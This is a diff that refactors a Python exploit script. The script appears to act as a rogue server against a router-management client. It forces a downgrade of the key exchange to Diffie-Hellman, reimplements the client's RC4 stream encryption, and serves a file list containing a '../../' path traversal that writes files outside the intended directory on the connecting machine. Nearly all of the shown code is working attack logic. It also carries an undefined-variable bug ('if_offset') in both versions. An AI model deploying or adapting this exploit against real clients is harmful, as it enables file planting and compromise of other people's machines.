@@ -67,23 +67,16 @@ class RC4:
     def send_block_crypt(self, data, padding, client = False):
         retval_data = bytearray(data)
         data_length = len(retval_data)
-        counter = 0
-       
         j = self.j
-        while (counter < data_length):
+        for counter in range(data_length):
             i = (self.i + counter + 1) & 255
-            j = (j + self.k + self.S[i]) & 255 
+            j = (j + self.k + self.S[i]) & 255
             t = self.S[i]
             self.S[i] = self.S[j]
             self.S[j] = t
             retval_data[counter] = data[counter] ^ self.S[(self.S[i] + self.S[j]) & 255]
 
-            if client == True:
-                self.k = retval_data[counter]
-            else:
-                self.k = data[counter]
-            counter = counter + 1
-
+            self.k = retval_data[counter] if client == True else data[counter]
         j = self.k + j
 
         for i in range(256):
@@ -93,16 +86,13 @@ class RC4:
             self.S[j] = t
 
         retval_padding = bytearray(10)
-        counter = 0
-        while (counter < 10):
+        for counter in range(10):
             i = (counter + (self.i + data_length + 1)) & 255
             j = (j + self.S[i] & 0xff)
             t = self.S[i]
             self.S[i] = self.S[j]
             self.S[j] = t
             retval_padding[counter] = padding[counter] ^ self.S[(self.S[i] + self.S[j]) & 255]
-            counter = counter + 1     
-
         self.i = data_length + 10
         self.j = j
         if client == False:
@@ -112,24 +102,17 @@ class RC4:
 
 def get_request_id(data):
     id_offset = data.find(b'\x06\x00\xff\x09')
-    if (id_offset == -1):
-        id_offset = data.find(b'\x06\x00\xff\x08')
-        if (if_offset == -1):
-            return None
-        else:
-            return data[id_offset:id_offset+6]
-    else:
-        return data[id_offset:id_offset+5]   
+    if id_offset != -1:
+        return data[id_offset:id_offset+5]
+    id_offset = data.find(b'\x06\x00\xff\x08')
+    return None if (if_offset == -1) else data[id_offset:id_offset+6]   
 
 def get_login_hash(data):
     hash_offset = data.find(b'\x0a\x00\x00\x31\x11\x00')
-    if (hash_offset == -1):
-       return None
-    else:
-        return data[hash_offset:hash_offset+22]   
+    return None if (hash_offset == -1) else data[hash_offset:hash_offset+22]   
 
 def downgrade_attack(sock):
-    
+
     # Currently just listening for messages to 5 (DH) and 6 (ECSRP)
     message_length = sock.recv(1)
     handler = sock.recv(1)
@@ -138,7 +121,7 @@ def downgrade_attack(sock):
     elif (handler[0] == 6):
         # ignore this packet. This should trigger a DH request
         ignore = sock.recv(message_length[0])
-            
+
         # the client should send a DH key exchange request now
         message_length = sock.recv(1)
         handler = sock.recv(1)
@@ -160,7 +143,7 @@ def downgrade_attack(sock):
     client_public = int.from_bytes(client_public_bytes, byteorder='big', signed=False)
     print('[+] Received client\'s public component:')
     print('\t%x' % client_public)
-    
+
     print('[+] Generating a secret:')
     local_secret = random.getrandbits(128)
     print('\t%x' % local_secret)
@@ -170,7 +153,7 @@ def downgrade_attack(sock):
     shared_base = 5
     server_public = pow(shared_base, local_secret, shared_prime)
     print('\t%x' % server_public)
-    
+
     print('[+] Sending server\'s public component to client.')
     sock.sendall(b'\xf8' + b'\x05' + server_public.to_bytes(0xf8, byteorder='big'))
 
@@ -264,7 +247,7 @@ def downgrade_attack(sock):
     list_request = sock.recv(message_length[0])
     if (list_request.find(b'list') == -1):
         print('[-] No list in the list request.')
-    
+
     list_response = (b'{ crc: 164562873, size: 36, name: "../../../../../../../../../Users/Public/lol.txt", unique: "advtool-fc1932f6809e.jg", version: "6.39.3" },\n' +
                      b'{ crc: 2939435109, size: 3082, name: "dhcp.jg", unique: "dhcp-eaa3bb8c4b37.jg", version: "6.39.3" },\n' +
                      b'{ crc: 1183779834, size: 12489, name: "dude.jg", unique: "dude-65f18faed649.jg", version: "6.39.3" },\n' +
@@ -302,16 +285,12 @@ def downgrade_attack(sock):
     for n in chunks:
         if first == True:
             first = False
-            sock.sendall(n)
+        elif (len(n) == 255):
+            sock.sendall(b'\xff\xff')
         else:
-            if (len(n) == 255):
-                sock.sendall(b'\xff\xff')
-                sock.sendall(n)
-            else:
-                sock.sendall(bytes([len(n)]))
-                sock.sendall(b'\xff')
-                sock.sendall(n)
-
+            sock.sendall(bytes([len(n)]))
+            sock.sendall(b'\xff')
+        sock.sendall(n)
     print('[+] Waiting for list close message')
     message_length = sock.recv(1)
     handler = sock.recv(1)
@@ -365,7 +344,7 @@ if __name__ == '__main__':
 
     while True:
         client_sock, address = server.accept()
-        print('[+] Accepted connection from %s:%s' % (address[0], address[1]))
+        print(f'[+] Accepted connection from {address[0]}:{address[1]}')
         client_handler = threading.Thread(target=downgrade_attack, args=(client_sock,))
         client_handler.start()
 
